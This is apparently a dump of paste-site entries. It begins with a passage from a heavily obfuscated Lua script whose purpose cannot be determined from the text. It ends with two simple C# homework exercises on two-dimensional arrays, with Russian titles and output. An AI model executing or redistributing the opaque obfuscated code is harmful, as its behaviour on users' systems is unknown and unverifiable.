je=T(je)Fe=27157998795134-(-538600)Re=z(308930+-332746)Oe=Ye[we]Te=s[O]we=s[Y]re=we(Re,Fe)Ye=Te[re]we=s[O]Fe=z(721692+-745592)le=z(913543+-937376)re=s[Y]Re=re(Fe,ye)le=De[le]Te=we[Re]Re=-735436+4320806650024 we=L(-252667+13414436,{se;O;Y})ce=z(-503810-(-480144))Pe={[Oe]=Ye;[Te]=we}le=le(De,Pe)ye=-796654+6407785575317 le=z(-268037+244204)ze=nil Ye=s[O]Te=s[Y]re=z(32268-56042)we=Te(re,Re)Oe=Ye[we]le=De[le]Te=s[O]Re=z(266485-290162)Le=z(-1067597-(-1043901))we=s[Y]Fe=-1008700+11221245393061 re=we(Re,Fe)Fe=z(-546940+523127)Ye=Te[re]we=s[O]re=s[Y]he=32005441335183-718168 Re=re(Fe,ye)re=z(-5173-18888)Te=we[Re]Re=-42918+22549892763818 we=L(14066893-627615,{ue,O;Y})Pe={[Oe]=Ye,[Te]=we}Ge=T(Ge)le=le(De,Pe)Ye=s[O]Te=s[Y]we=Te(re,Re)Oe=Ye[we]ee=14466765793279-511407 Ie=z(-667752+644095)Te=s[O]t=nil Ce=nil f=T(f)Fe=88890+29366964460081 Re=z(309735+-333366)we=s[Y]re=we(Re,Fe)Fe=z(-15278+-8743)Ye=Te[re]we=s[O]ye=388211+32462590758553 re=s[Y]Re=re(Fe,ye)Te=we[Re]Re=913069-912569 le=z(-178824+155000)le=De[le]re=-85991+85992 we={re;Re}Re=s[O]Fe=s[Y]ye=Fe(Ie,he)re=Re[ye]ye=s[O]Ie=s[Y]he=Ie(Le,ee)Re=-185076+185077 ee=z(739683-763366)Fe=ye[he]Ie=s[O]he=s[Y]de=nil Le=he(ee,oe)ye=Ie[Le]he=s[O]oe=z(243203+-267186)Le=s[Y]ee=Le(oe,Qe)se=T(se)Ie=he[ee]ee=s[O]he=-605529+605629 oe=s[Y]Qe=oe(ce,ge)Le=ee[Qe]ge=z(-543583-(-520030))oe=s[O]Qe=s[Y]ce=Qe(ge,Ne)ee=oe[ce]b=nil Qe=s[O]Ne=z(727641+-751694)ce=s[Y]ge=ce(Ne,ne)oe=Qe[ge]Qe=y(15390658-715073,{Se})Pe={[Oe]=Ye,[Te]=we,[re]=Re;[Fe]=ye;[Ie]=he;[Le]=ee,[oe]=Qe}Fe=25675789320666-463654 le=le(De,Pe)le=s[U]Te=s[O]Re=z(14930-39011)Le=3870550536456-977406 we=s[Y]re=we(Re,Fe)Ye=Te[re]Fe=z(519489+-543053)ye=27816211368879-563479 we=s[O]Be=T(Be)re=s[Y]m=nil Ie=25891627713975-824991 Re=re(Fe,ye)Te=we[Re]re=s[O]Re=s[Y]ye=z(142627+-166340)Fe=Re(ye,Ie)we=re[Fe]Fe=s[O]he=z(881780-905797)ye=s[Y]Se=T(Se)Pe=z(145595-169647)Ie=ye(he,Le)Re=Fe[Ie]re=Re..k Le=32826817727442-(-552932)Fe=s[O]he=z(-523812-(-499995))Pe=le[Pe]ye=s[Y]Ie=ye(he,Le)De=nil Re=Fe[Ie]Fe=-216570+216575 Oe={[Ye]=Te;[we]=re;[Re]=Fe}Pe=Pe(le,Oe)Oe=z(592207-615829)Pe=d[Oe]Re=657429+30407086976826 re=z(270657+-294624)Ye=s[O]Te=s[Y]we=Te(re,Re)Oe=Ye[we]le=Pe[Oe]ue=T(ue)Oe=F(-991090+16025282,{O,Y,g;Z;V;M;U})U=T(U)Pe=le(Oe)V=T(V)end end else if C<289629+13066646 then if C<12681696-(-636295)then C=-104953+1591731 l=nil s[u[953211+-953206]]=B else C=B and 20014+14213075 or 14304344-(-299886)end else if C<13805894-411591 then B=z(-181367+157674)Y=I(928909+12039744,{u[24051+-24047];j})C=d[B]w={C(Y)}B=w[-321517+321518]Y=B l=w[-897314-(-897316)]w=not Y C=w and-108476+13450138 or 11764690-(-693736)B=w else C=true O=z(-257187+233565)o=z(-51430-(-27849))s[u[-681315-(-681316)]]=C l=d[O]C=d[z(-131682-(-108031))]e=530356+25827532429126 j=s[u[599269+-599267]]Y=s[u[316323-316320]]w=Y(o,e)O=j[w]B=l[O]O=.4 j=L(6997456-517017,{u[-76922-(-76923)]})l=B(O,j)B={}end end end else if C<14315365-445703 then if C<14535016-820956 then if C<-607156+14317508 then B=s[u[779027+-779019]]C=B and-553139+17283677 or 7718971-(-139417)else B=z(-1030653+1006838)C=d[B]l=s[u[-764161-(-764162)]]B=C(l)B={}C=d[z(720337+-744015)]end else if C<13163271-(-694584)then w=905249+35184371183583 C={}s[u[651887-651885]]=C e=-902564+902819 B=s[u[508597+-508594]]Y=B B=O%w s[u[-531773-(-531777)]]=B o=O%e e=255082+-255080 w=o+e s[u[-731741+731746]]=w Q=z(806121+-829842)C=230555+5277369 e=d[Q]Q=z(-553111-(-529157))o=e[Q]e=o(l)o=z(980316+-1004221)j[O]=o o=-668554-(-668749)Q=420889+-420888 n=e c=-974410-(-974411)N=c c=-335085+335085 g=N<c c=Q-N else C=-114795+13386769 j=s[u[477981+-477975]]O=j==l B=O end end else if C<-693074+14603658 then if C<-158072+14035942 then K=N==g q=K C=3556183-(-764568)else B=s[u[122169+-122168]]C=B and-285921+8274723 or 6765442-978060 end else B=n C=c C=n and 7242931-696891 or 15559349-587842 end end end else if C<112573+14353510 then if C<137940+13989359 then if C<-698192+14633460 then if C<433860+13491881 then C=true s[u[769997+-769996]]=C B={}C=d[z(-1040189-(-1016424))]else p=z(887476+-911056)a=P()s[a]=q B=d[p]x=-510224-(-510324)p=z(279426-303299)C=B[p]b=-392409-(-392410)p=-691338+691339 k=969513-969258 B=C(p,x)p=P()x=422161-422161 s[p]=B C=s[e]B=C(x,k)x=P()k=838409+-838408 s[x]=B C=s[e]U=s[p]B=C(k,U)m=-1013139-(-1013141)k=P()s[k]=B t=z(-906693+882874)B=s[e]U=B(b,m)B=261641-261640 C=U==B X=-842530-(-842530)m=z(388795-412575)B=z(-889843-(-866291))U=P()J=-559855-(-569855)s[U]=C v=d[t]C=z(763437+-787412)C=M[C]V=s[e]f={V(X,J)}t=v(E(f))v=z(-76026+52246)A=t..v b=m..A C=C(M,B,b)b=P()m=z(184102+-207795)s[b]=C A=F(-580185+16562002,{e,a,c;j,O;W,U,b;p,k;x;n})B=d[m]m={B(A)}C={E(m)}m=C C=s[U]C=C and 14626600-203287 or-778844+10104598 end else if C<13112169-(-826076)then B=z(-958514+934699)C=d[B]l=s[u[-199454-(-199455)]]B=C(l)B={}C=d[z(411866+-435848)]else o=nil w=nil C=7961136-(-1008284)end end else if C<14418886-46141 then if C<15334411-1026562 then C=nil n=397114+28915245639006 w=s[u[-548641+548643]]Q=z(-739743-(-716193))o=s[u[532123-532120]]e=o(Q,n)B=w[e]B={C,B}C=d[z(968225+-992090)]else C=14002363-88651 Z=z(-638022-(-614231))g=d[Z]Z=z(-431450+407538)N=g[Z]n=N end else if C<997626+13418158 then O=s[u[172632+-172629]]j=-875393+875425 N=-269923-(-269936)l=O%j Y=s[u[-197314+197318]]n=766492+-766490 e=s[u[413211-413209]]M=s[u[-280070-(-280073)]]Z=M-l M=208929-208897 g=Z/M c=N-g Q=n^c o=e/Q w=Y(o)Y=4295272052-304756 j=w%Y w=-304618+304620 Y=w^l O=j/Y Q=954922-954921 n=490767+-490511 Y=s[u[595757-595753]]e=O%Q Q=941684+4294025612 o=e*Q C=-822524+11862966 w=Y(o)Y=s[u[513060+-513056]]e=-462660-(-528196)o=Y(O)j=w+o N=238817+-238561 w=491079-425543 Y=j%w o=j-Y w=o/e e=565825-565569 o=Y%e Q=Y-o e=Q/n n=-934673+934929 j=nil Y=nil Q=w%n O=nil c=w-Q n=c/N l=nil c={o,e;Q,n}e=nil w=nil Q=nil s[u[344269-344268]]=c o=nil n=nil else A=s[O]C=A and 8022794-569857 or 613710+9392339 B=A end end end else if C<15128784-489508 then if C<31945+14530920 then if C<-1019121+15517125 then n=s[u[341964+-341961]]Y=O e=z(431390-455380)e=w[e]Z=2960715291326-775516 g=z(140074+-163672)c=s[u[581395+-581391]]N=c(g,Z)Q=n[N]e=e(w,Q)o=e C=e and 2884234-(-67373)or 599378+5256543 else B={}O=nil C=d[z(155544+-179382)]Y=nil l=nil j=nil end else if C<15339+14596697 then C=d[z(-981995+958337)]B={l}else l=s[u[957708-957707]]B=l C=l and 35752+2559601 or 279859+3511823 end end else if C<15684548-977465 then if C<15683573-1021583 then C=true C=C and 183042+11475664 or 8187348-(-795447)else l=D[1008841-1008840]B={}C=l l=nil s[u[666457+-666456]]=C C=d[z(-276494-(-252468))]end else C=s[u[-488070-(-488073)]]B=C()l=B C=l and 626410+-275340 or 7126759-(-677561)end end end end else if C<16150808-538357 then if C<14242088-(-961013)then if C<867320+14127254 then if C<14809080-(-109366)then if C<15249952-352546 then Y=z(856567-880249)j=d[Y]w=s[u[125970-125969]]n=34081935546492-(-58754)o=s[u[-93753+93755]]C=z(-243170+219231)Q=z(-532730+508782)e=o(Q,n)C=l[C]Q=3300787285366-(-514187)Y=w[e]O=j[Y]e=z(-238274+214448)Y=s[u[-847105+847106]]w=s[u[-944295-(-944297)]]o=w(e,Q)j=Y[o]B=O[j]C=C(l,B)C=814370+5750663 else o=s[u[-798784+798785]]c=11641321523415-(-330837)n=z(363944+-387812)e=s[u[441607+-441605]]Q=e(n,c)B=o[Q]C=Y==B C=C and-487540+8824426 or 12054828-(-217148)end else if C<15737621-768739 then w=nil C=15832384-55127 Y=nil else c=z(-237414+213502)n=d[c]C=-19396+6565436 B=n end end else if C<-645643+15683026 then if C<15168994-142400 then W=z(54327-78108)q=13474196065020-143994 g=s[u[605773-605772]]Z=s[u[-433908+433910]]C=-844631+10814433 M=Z(W,q)N=g[M]c=o[N]n=c>=e Q=n else C=5249499-(-13010)end else if C<385656+14727482 then C=3968848-917877 Q=s[w]e=not Q B=e else O=s[u[484837+-484835]]C=15560883-(-1004055)e=z(621667-645276)Q=30188756849053-236212 Y=s[u[484500+-484497]]w=s[u[-610542+610546]]o=w(e,Q)j=Y[o]l=O[j]B=l end end end else if C<-775457+16174253 then if C<524438+14801231 then if C<15150662-(-154427)then e=z(571156+-594766)Q=-742748+20656328948462 Y=s[u[-989600-(-989601)]]j=B w=s[u[-87828-(-87830)]]o=w(e,Q)C=z(41250+-65306)C=j[C]B=Y[o]C=C(j,B)Y=C C=Y and-8367+827842 or 30316+14521041 else C=d[z(-815548+791737)]B={}end else if C<16172194-795772 then B={}C=d[z(659031+-682761)]else C=F(6191463-(-441063),{Y})K={C()}B={E(K)}C=d[z(-186311+162765)]end end else if C<15931224-496080 then if C<-630445+16037358 then Q=z(-524630+500950)e=d[Q]g=z(-1069415-(-1045633))n=s[u[369309-369308]]c=s[u[-602864-(-602866)]]Z=-991684+18396779201338 N=c(g,Z)Q=n[N]C=e[Q]M=z(624900+-648778)Z=527215841501-(-765976)g=z(-295750+271813)n=s[u[733164+-733163]]W=1286526358305-233674 c=s[u[215934+-215932]]N=c(g,Z)Q=n[N]e=C(Q)N=s[u[-613134+613135]]g=s[u[-52432-(-52434)]]Z=g(M,W)c=N[Z]n=o[c]C=n and 14070729-(-941836)or-1009450+10979252 Q=n else Z=I(-208780+3469899,{o;O;Y;w})g=P()s[g]=Z M=F(9176871-603801,{O;Y,n})Z=P()s[Z]=M M=s[g]a={M()}H=a[1014540+-1014538]W=a[106911+-106910]M=not W C=M and 7713866-58685 or 2892547-234367 end else j=s[u[153380-153374]]Q=z(-682830+659185)w=s[u[-748123+748126]]o=s[u[339735+-339731]]n=-319412+33239076019242 e=o(Q,n)Y=w[e]w=true j[Y]=w w=z(979164+-1002786)n=z(387731+-411468)c=21780852728804-670790 O=nil Y=d[w]C=14634321-18235 o=s[u[367259+-367256]]e=s[u[85835-85831]]l=nil Q=e(n,c)w=o[Q]j=Y[w]Y=j()end end end else if C<-83874+16306508 then if C<-737234+16493069 then if C<15599347-(-97226)then if C<16228378-594674 then B={O}C=d[z(525501-549581)]else e=nil C=15493970-(-121927)o=nil Y=nil end else if C<15235391-(-510419)then Q=z(-732314+708274)B=s[u[582460-582455]]Q=B[Q]C=1712365-421875 Q=Q(B)else B=s[u[-691825+691830]]C=B and 96804+15603534 or 801861-(-488629)end end else if C<16388351-415448 then if C<16788180-989799 then O,w=j(l,O)C=O and-886798+15360010 or-24400+12392550 else C=B and 711107+9852620 or 13730883-346007 end else Y=-809530+809531 O=s[u[2649-2648]]w=-590187-(-590189)j=O(Y,w)O=257832+-257831 l=j==O C=l and 8754237-(-210697)or 17270124-500996 B=l end end else if C<15787953-(-796343)then if C<838582+15557479 then if C<17401681-1024553 then e=z(20432-44024)l=D[-818525-(-818526)]j=z(712200+-736101)Q=-411876+5680053146424 O=d[j]Y=s[u[47302+-47301]]w=s[u[-207771+207773]]o=w(e,Q)j=Y[o]B=O[j]o=z(352234-376186)j=s[u[-331224-(-331225)]]Y=s[u[-114484-(-114486)]]e=21758764032381-(-673303)w=Y(o,e)O=j[w]C=B[O]O=C Q=z(-435676+411607)w=s[u[-544233+544234]]o=s[u[-135033-(-135035)]]n=-897657+15720402915089 e=o(Q,n)Y=w[e]j=O[Y]B=j C=j and 486600+14718110 or 232634+16165321 else c=27717053705800-31710 C=-605028+13173029 o=s[u[-725667+725669]]n=z(191911-215649)e=s[u[920508-920505]]Q=e(n,c)w=o[Q]Y=O[w]w=z(-197490+173525)w=Y[w]w=w(Y)B=w end else if C<16014617-(-478818)then w=s[u[956521+-956520]]n=26344564232405-(-204566)Q=z(-799118-(-775575))o=s[u[-30757+30759]]e=o(Q,n)Y=w[e]C=661945+14542765 j=O[Y]Y=z(1048048+-1072013)Y=j[Y]Y=Y(j)B=Y else C=B and 12893740-1027501 or 3565142-(-587004)end end else if C<15835995-(-899385)then if C<-784189+17404882 then g=z(-198728+174883)c=z(693231+-717093)o=z(-869827+846205)B=d[o]N=179158+17440450470883 e=s[u[-58793-(-58794)]]Q=s[u[-673909+673911]]n=Q(c,N)Q=z(656843+-680414)o=e[n]C=B[o]n=-294737+31739791014156 o=.2 H=z(188676+-212520)B=C(o)B=s[u[32344-32343]]Z=3441933878686-(-278692)O=nil o=s[u[-953920+953922]]e=o(Q,n)C=B[e]B=false j[C]=B Q=z(241963-265645)e=d[Q]n=s[u[-590418+590419]]C=z(480710+-504649)c=s[u[-571878-(-571880)]]N=c(g,Z)Z=18229643090246-63518 K=14859238288634-938483 Q=n[N]g=11153155476462-571301 o=e[Q]N=z(155267+-179015)W=-940193+16512612972202 Q=s[u[-975339-(-975340)]]C=j[C]n=s[u[-825826-(-825828)]]c=n(N,g)N=1024893+22439270860116 e=Q[c]B=o[e]C=C(j,B)g=z(271707+-295680)c=z(120800+-144650)o=z(981646+-1005268)B=d[o]e=s[u[303530+-303529]]Q=s[u[-380242-(-380244)]]n=Q(c,N)o=e[n]C=B[o]o=-431185+431187 N=10101025999073-685698 M=19868836949202-886958 e=r(2748464-(-1028963),{w})B=C(o,e)o=z(616164-640065)B=d[o]e=s[u[-283905-(-283906)]]c=z(355078-378715)Q=s[u[-850722-(-850724)]]n=Q(c,N)o=e[n]C=B[o]N=29762579011603-41456 c=z(351394+-375226)w=T(w)Y=nil e=s[u[-756216+756217]]Q=s[u[-407635-(-407637)]]j=nil n=Q(c,N)o=e[n]n=s[u[323227-323226]]c=s[u[-42708+42710]]N=c(g,Z)Q=n[N]c=s[u[-62808-(-62809)]]q=z(938478-962552)N=s[u[743352-743350]]a=24612305854957-(-920280)Z=z(-1052754-(-1028811))B=z(488646+-512295)g=N(Z,M)M=z(159263+-183009)n=c[g]N=s[u[168774-168773]]g=s[u[-57200+57202]]Z=g(M,W)c=N[Z]Z=s[u[-832973-(-832974)]]M=s[u[-27065+27067]]W=M(q,K)g=Z[W]M=s[u[-968995-(-968998)]]q=s[u[-675974-(-675975)]]K=s[u[-922808-(-922810)]]i=K(H,a)W=q[i]Z=M[W]K=378840+12487008390878 N=g..Z Z=s[u[1042441+-1042440]]M=s[u[-947572-(-947574)]]q=z(52163-75919)W=M(q,K)g=Z[W]B=C[B]Z=890316+-890313 l=nil e={[Q]=n,[c]=N;[g]=Z}B=B(C,o,e)C=d[z(-963562+939484)]B={}else w=z(-343326+319437)n=z(-247623-(-223944))Y=d[w]c=16599341231991-(-372410)o=s[u[-130614+130617]]e=s[u[876817+-876813]]Q=e(n,c)e=-185505+185505 w=o[Q]C=-990267+8848655 j=Y[w]w=342719+-342719 o=-243297-(-243298)Y=j(w,o,e)B=O-Y O=B end else O=s[u[815411-815409]]j=s[u[-133863-(-133866)]]C=346673+8618261 l=O==j B=l end end end end end end end end C=#G return E(B)end,295659+-295659,function(d,z)local E=j(z)local D=function(...)return C(d,{...},z,E)end return D end,function()O=O+(-986095-(-986096))l[O]=695379-695378 return O end,function(d,z)local E=j(z)local D=function()return C(d,{},z,E)end return D end,{}return(w(166969+2276603,{}))(E(B))end)(getfenv and getfenv()or _ENV,unpack or table[z(778718+-802630)],newproxy,setmetatable,getmetatable,select,{...})end)(...)"
9Fz0AsG1,ДЗ: Наибольший элемент,NikaBang,C#,Sunday 19th of October 2025 04:34:34 AM CDT,"internal class Program
{
    static void Main(string[] args)
    {
        int[,] array = new int[10, 10];
        int maxValue = 0;
        int newValueForMax = 0;
        int minRandom = 1;
        int maxRandom = 10;
        Random random = new Random();
        Console.WriteLine(""Исходный массив:"");

        for (int i = 0; i < array.GetLength(0); i++)
        {
            for (int j = 0; j < array.GetLength(1); j++)
            {
                array[i, j] = random.Next(minRandom, maxRandom);
                Console.Write(array[i, j] + "" "");
                
                if(maxValue <  array[i, j])
                {
                    maxValue = array[i, j];
                }
            }
            Console.WriteLine();
        }

        Console.WriteLine(""\nИзменненый массив:"");

        for (int i = 0; i < array.GetLength(0); i++)
        {
            for (int j = 0; j < array.GetLength(1); j++)
            {
                if (maxValue == array[i, j])
                {
                    array[i, j] = newValueForMax;
                }

                Console.Write(array[i, j] + "" "");
            }
            Console.WriteLine();
        }
    }
}"
a6RmEUXA,ДЗ: Работа с конкретными строками/столбцами,NikaBang,C#,Sunday 19th of October 2025 04:15:25 AM CDT,"internal class Program
{
    static void Main(string[] args)
    {
        int line = 1;
        int column = 0;
        int sum = 0;
        int productOfNumbers = 1;

        int[,] arrya = {
            { 1, 2, 3 },
            { 4, 5, 6 },
            { 7, 8, 9 }
        };

        for (int i = 0; i < arrya.GetLength(1); i++)
        {
            sum += arrya[line, i];
        }

        for (int i = 0;i < arrya.GetLength(0); i++)
        {
            productOfNumbers *= arrya[i, column];
        }

        for(int i = 0; i < arrya.GetLength(0) ; i++)
        {
            for (int j = 0; j < arrya.GetLength(1); j++)
            {
                Console.Write(arrya[i, j] + "" "");
            }
            Console.WriteLine();
        }

        Console.WriteLine($""сумма второй строки - {sum},\nпроизведение первого столбца - {productOfNumbers}."");
    }
}"
